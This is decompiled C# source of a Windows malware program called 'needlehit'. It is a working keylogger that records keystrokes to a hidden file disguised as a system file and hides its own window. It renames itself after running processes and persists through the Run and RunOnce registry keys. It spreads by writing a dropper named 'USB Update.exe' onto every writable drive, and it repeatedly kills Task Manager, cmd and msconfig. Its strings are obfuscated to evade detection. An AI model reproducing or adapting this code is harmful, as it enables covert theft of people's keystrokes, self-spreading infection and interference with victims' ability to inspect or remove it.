using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using needlehit.My;
using needlehit.My.Resources;

namespace needlehit;

[DesignerGenerated]
public class Form1 : Form
{
	public class Keylogger_
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		[AccessedThroughProperty("timer1_")]
		private Timer _timer1_;

		public string lol;

		public int time;

		public int counter;

		private string file;

		public virtual Timer timer1_
		{
			[DebuggerNonUserCode]
			get
			{
				return _timer1_;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			set
			{
				EventHandler eventHandler = timer1_Tick;
				if (_timer1_ != null)
				{
					_timer1_.remove_Tick(eventHandler);
				}
				_timer1_ = value;
				if (_timer1_ != null)
				{
					_timer1_.add_Tick(eventHandler);
				}
			}
		}

		public string keys => @int switch
		{
			8 => "[Backspace]", 
			9 => "[Tab]", 
			13 => "[Enter]", 
			16 => "[Shift]", 
			17 => "[Strg]", 
			18 => "[Alt]", 
			20 => "[Umstell.]", 
			32 => " ", 
			33 => "!", 
			34 => "\u00b4\u00b4", 
			35 => "#", 
			36 => "$", 
			37 => "%", 
			38 => "&", 
			39 => "'", 
			40 => "(", 
			41 => ")", 
			42 => "*", 
			43 => "+", 
			44 => ",", 
			45 => "-", 
			46 => ".", 
			47 => "/", 
			48 => "0", 
			49 => "1", 
			50 => "2", 
			51 => "3", 
			52 => "4", 
			53 => "5", 
			54 => "6", 
			55 => "7", 
			56 => "8", 
			57 => "9", 
			58 => ":", 
			59 => ";", 
			60 => "<", 
			61 => "=", 
			62 => ">", 
			63 => "?", 
			64 => "@", 
			65 => "a", 
			66 => "b", 
			67 => "c", 
			68 => "d", 
			69 => "e", 
			70 => "f", 
			71 => "g", 
			72 => "h", 
			73 => "i", 
			74 => "j", 
			75 => "k", 
			76 => "l", 
			77 => "m", 
			78 => "n", 
			79 => "o", 
			80 => "p", 
			81 => "q", 
			82 => "r", 
			83 => "s", 
			84 => "t", 
			85 => "u", 
			86 => "v", 
			87 => "w", 
			88 => "x", 
			89 => "y", 
			90 => "z", 
			91 => "[Win]", 
			92 => "[Win]", 
			93 => "]", 
			94 => "^", 
			95 => "_", 
			96 => "`", 
			97 => "a", 
			98 => "b", 
			99 => "c", 
			100 => "d", 
			101 => "e", 
			102 => "f", 
			103 => "g", 
			104 => "h", 
			105 => "i", 
			106 => "j", 
			107 => "k", 
			108 => "l", 
			109 => "m", 
			110 => "n", 
			111 => "o", 
			112 => "[F1]", 
			113 => "[F2]", 
			114 => "[F3]", 
			115 => "[F4]", 
			116 => "[F5]", 
			117 => "[F6]", 
			118 => "[F7]", 
			119 => "[F8]", 
			120 => "[F9]", 
			121 => "[F10]", 
			122 => "[F11]", 
			123 => "[F12]", 
			124 => "|", 
			125 => "}", 
			126 => "~", 
			128 => "€", 
			130 => "‚", 
			131 => "ƒ", 
			132 => "„", 
			133 => "…", 
			134 => "†", 
			135 => "‡", 
			136 => "ˆ", 
			138 => "Š", 
			139 => "‹", 
			142 => "Ž", 
			145 => "‘", 
			146 => "’", 
			147 => "\"", 
			148 => "\"", 
			149 => "•", 
			150 => "–", 
			151 => "—", 
			152 => "\u02dc", 
			153 => "™", 
			154 => "š", 
			155 => "›", 
			158 => "ž", 
			159 => "Ÿ", 
			160 => "", 
			161 => "", 
			162 => "", 
			163 => "", 
			164 => "[Alt]", 
			165 => "[Alt]", 
			166 => "¦", 
			167 => "§", 
			168 => "\u00a8", 
			169 => "©", 
			170 => "ª", 
			171 => "«", 
			172 => "¬", 
			174 => "®", 
			175 => "\u00af", 
			176 => "°", 
			177 => "±", 
			178 => "²", 
			179 => "³", 
			180 => "\u00b4", 
			181 => "µ", 
			183 => ".", 
			184 => "\u00b8", 
			185 => "¹", 
			186 => "ü", 
			187 => "+", 
			188 => ",", 
			189 => "-", 
			190 => ".", 
			191 => "¿", 
			192 => "ö", 
			193 => "Á", 
			194 => "Â", 
			195 => "Ã", 
			196 => "Ä", 
			197 => "Æ", 
			198 => "Ç", 
			199 => "È", 
			200 => "É", 
			201 => "Ê", 
			202 => "Ë", 
			203 => "Ì", 
			204 => "Í", 
			205 => "Í", 
			206 => "Î", 
			207 => "Ï", 
			208 => "Ð", 
			209 => "Ñ", 
			210 => "Ò", 
			211 => "Ó", 
			212 => "Ô", 
			213 => "Õ", 
			214 => "Ö", 
			215 => "×", 
			216 => "Ø", 
			217 => "Ù", 
			218 => "Ú", 
			219 => "Û", 
			220 => "Ü", 
			221 => "Ý", 
			222 => "ä", 
			223 => "ß", 
			224 => "à", 
			225 => "á", 
			226 => "â", 
			227 => "<", 
			228 => "ä", 
			229 => "æ", 
			230 => "ç", 
			231 => "è", 
			232 => "é", 
			233 => "ê", 
			234 => "ë", 
			235 => "ì", 
			236 => "í", 
			237 => "í", 
			238 => "î", 
			239 => "ï", 
			240 => "ð", 
			241 => "ñ", 
			242 => "ò", 
			243 => "ó", 
			244 => "ô", 
			245 => "õ", 
			246 => "ö", 
			247 => "÷", 
			248 => "ø", 
			249 => "ù", 
			250 => "ú", 
			251 => "û", 
			252 => "ü", 
			253 => "ý", 
			254 => "þ", 
			255 => "ÿ", 
			_ => "", 
		};

		public Keylogger_()
		{
			__ENCAddToList(this);
			lol = "";
			time = 0;
			counter = 0;
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			checked
			{
				lock (__ENCList)
				{
					if (__ENCList.Count == __ENCList.Capacity)
					{
						int num = 0;
						int num2 = __ENCList.Count - 1;
						int num3 = 0;
						while (true)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							WeakReference weakReference = __ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									__ENCList[num] = __ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						__ENCList.RemoveRange(num, __ENCList.Count - num);
						__ENCList.Capacity = __ENCList.Count;
					}
					__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetAsyncKeyState(int vkey);

		public void start_()
		{
			//IL_0025: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Expected O, but got Unknown
			file = Application.get_StartupPath() + "\\*n*e*e*d*l*e*h*i*t*.*w*i*n*d*o*w*s*3*2*.*s*y*s".Replace("*", "");
			timer1_ = new Timer();
			timer1_.set_Interval(50);
			timer1_.Start();
		}

		public void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					lol += g();
					if (counter == 10)
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, lol, true);
						lol = "";
						counter = 0;
					}
					else
					{
						counter++;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public string g()
		{
			int num = 1;
			do
			{
				if (GetAsyncKeyState(num) != -32767)
				{
					num = checked(num + 1);
					continue;
				}
				return this.get_keys(num);
			}
			while (num <= 255);
			return "";
		}
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private Random rnd;

	private List<string> st;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		rnd = new Random();
		st = new List<string>();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(256, 154);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Visible(false);
		st.Add("t#a#s#k#m#g#r".Replace("#", ""));
		st.Add("c#m#d".Replace("#", ""));
		st.Add("m#s#c#o#n#f#i#g".Replace("#", ""));
		st.Add("S!o!f!t!w!a!r!e!\\!M!i!c!r!o!s!o!f!t!\\!W!i!n!d!o!w!s!\\!C!u!r!r!e!n!t!V!e!r!s!i!o!n!\\!R!u!n".Replace("!", ""));
		st.Add("S?o?f?t?w?a?r?e?\\?M?i?c?r?o?s?o?f?t?\\?W?i?n?d?o?w?s?\\?C?u?r?r?e?n?t?V?e?r?s?i?o?n?\\?R?u?n?O?n?ce".Replace("?", ""));
		st.Add("W>o>h>o>s>t> >W>i>n>d>o>w>s> >O>T>P> >H>o>s>t".Replace(">", ""));
		st.Add("A<g<e<b<o<o<t".Replace("<", ""));
		st.Add("7%4%9%3%6%4%9%8%2%3%6%4%9%4%5%6%0%9%3%4%6%5%9%4%4%0%5%3%4%.%t%x%t".Replace("%", ""));
		checked
		{
			if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Path.Combine(Application.get_StartupPath(), st[7])))
			{
				if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys")))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().MoveFile(Application.get_ExecutablePath(), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.exe"));
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "#Processname+-0-0-0-#DECRIPTFISH+" + GEN(), false);
					save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH", GEN());
					CN();
					Aut();
					((Form)this).Close();
				}
				if (Operators.CompareString(read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH"), Interaction.Command(), false) == 0)
				{
					save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH", GEN());
				}
				CN();
				Aut();
				List<string> uSB_Driver = Get_USB_Driver();
				int num = uSB_Driver.Count - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						if (!File.Exists(Path.Combine(uSB_Driver[num2], "USB Update.exe")))
						{
							File.WriteAllBytes(Path.Combine(uSB_Driver[num2], "USB Update.exe"), Resources.Droper_Needlehit_a);
						}
						num2++;
						continue;
					}
					break;
				}
			}
			else
			{
				((Form)this).Close();
			}
		}
	}

	public string GEN()
	{
		string text = "";
		int num = 0;
		checked
		{
			do
			{
				char[] array = Conversions.ToCharArrayRankOne("QWERTZUIOPASDFGHJKLYXCVBNM12345567890");
				text += Conversions.ToString(array[rnd.Next(0, array.Length - 1)]);
				num++;
			}
			while (num <= 30);
			return text;
		}
	}

	public void Aut()
	{
		string path = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname");
		string text = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "DECRIPTFISH");
		RegistryKey registryKey = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey(st[3]);
		registryKey.SetValue(st[5], Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path) + " " + text);
		registryKey.Close();
		RegistryKey registryKey2 = ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey(st[4]);
		registryKey2.SetValue(st[6], Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), path) + " " + text);
		registryKey2.Close();
	}

	public void CN()
	{
		Process[] processes = Process.GetProcesses();
		string text = "";
		do
		{
			text = processes[rnd.Next(0, 5)].ProcessName;
		}
		while (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + ".exe"));
		string text2 = read_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname");
		if (Operators.CompareString(text2, "-0-0-0-", false) == 0)
		{
			text2 = "needlehit.exe";
		}
		((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), text2), text + ".exe");
		save_proporty(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "needlehit.sys"), "Processname", text + ".exe");
	}

	public void save_proporty(string file, string zelle, string data)
	{
		checked
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(file))
			{
				string[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(file).Split(new char[1] { '#' });
				int num = array.Length - 1;
				int num2 = 0;
				string[] array2;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 <= num4)
					{
						array2 = array[num2].Split(new char[1] { '+' });
						if (Operators.CompareString(array2[0], zelle, false) == 0)
						{
							break;
						}
						num2++;
						continue;
					}
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, "#" + zelle + "+" + data, true);
					return;
				}
				array[num2] = array[num2].Replace(array2[1], data);
				string text = "";
				int num5 = array.Length - 1;
				int num6 = 0;
				while (true)
				{
					int num7 = num6;
					int num4 = num5;
					if (num7 > num4)
					{
						break;
					}
					text = text + array[num6] + Interaction.IIf(num6 == array.Length - 1, (object)"", (object)"#").ToString();
					num6++;
				}
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, text, false);
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(file, "#" + zelle + "+" + data, true);
			}
		}
	}

	public string read_proporty(string file, string zelle)
	{
		string[] array = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(file).Split(new char[1] { '#' });
		checked
		{
			int num = array.Length - 1;
			int num2 = 0;
			string[] array2;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					array2 = array[num2].Split(new char[1] { '+' });
					if (Operators.CompareString(array2[0], zelle, false) == 0)
					{
						break;
					}
					num2++;
					continue;
				}
				return "-0-0-0-";
			}
			return array2[1];
		}
	}

	public List<string> Get_USB_Driver()
	{
		List<string> list = new List<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		checked
		{
			int num = drives.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				string fullName = drives[num2].RootDirectory.FullName;
				try
				{
					File.WriteAllText(fullName + "\\a.", "");
					File.Delete(fullName + "\\a.");
					list.Add(fullName);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				num2++;
			}
			return list;
		}
	}

	public void KP(string st)
	{
		Process[] processesByName = Process.GetProcessesByName(st);
		checked
		{
			int num = processesByName.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					processesByName[num2].Kill();
					num2++;
					continue;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		KP(st[0]);
		KP(st[1]);
		KP(st[2]);
	}
}
